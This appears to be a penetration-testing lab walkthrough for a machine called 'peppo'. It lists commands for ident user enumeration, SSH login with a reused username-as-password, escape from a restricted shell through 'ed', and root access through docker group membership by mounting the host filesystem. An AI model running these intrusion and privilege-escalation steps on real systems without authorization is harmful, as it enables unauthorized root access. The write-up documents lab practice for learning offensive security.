#box

*Created: 1/3/2026*

### Step 1

**Tags:** #Credentials #SSH #Credential-Reuse

**Command:**
```bash
ssh eleanor@192.168.126.60
```

*Port: 22*

> 
> Discovered by chance a scenario where username = password after discovering eleanor as an user
> 
> After an initial scan where we didn't find anything seemingly vulnerable, we realize that Nmap prints for us a field on a few service called `auth-owners`.
> The same result could be achieved by using `ident-user-enum` on the open ports.
> 
```bash
ident-user-enum 192.168.126.60 22 113 5432 8080 10000
```

---

### Step 2

**Tags:** #ed #binaries #Linux #Restricted-Shell #Shells

🔗 **URL/Link:** https://0xss0rz.gitbook.io/0xss0rz/pentest/privilege-escalation/linux/escaping-restricted-shells

**Command:**
```bash
ed
!/bin/sh
```

*Asciinema Cast: [Step 2](attachments/Peppo-1.cast)*

> 
> We land on a rbash shell. We find ways to escape with the available commands
> 
> To escape a restricted shell it's required to be creative. By searching for Escaping Restricted Shell we discover that a command called `ed` can be ran and moreover permits has a GTFOBins that permits us to escape the restricted shell: [GTFOBins ed](https://gtfobins.github.io/gtfobins/ed/#shell)

---

### Step 3

**Tags:** #PATH #Linux

🔗 **URL/Link:** https://academy.hackthebox.com/beta/module/51/section/472

**Command:**
```bash
PATH=/usr/bin:${PATH}
```

> 
> To ease the pain, we change the PATH variable to permit us to execute binaries without referencing everytime /usr/bin

---

### Step 4

**Tags:** #GTFOBins #Linux #docker

🔗 **URL/Link:** https://gtfobins.github.io/gtfobins/docker/#shell

**Command:**
```bash
docker run -v /:/mnt --rm -it redmine chroot /mnt sh
```

> 
> With id or linpeas we discover that we belong to the docker group, we can use another GTFOBins to gain root
> 
> Before running the command, we first need to know what images are available on the given machine. To retrieve the available images we can do `docker images`
> 
```bash
eleanor@peppo:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
redmine             latest              0c8429c66e07        5 years ago         542MB
postgres            latest              adf2b126dda8        5 years ago         313MB
```

---

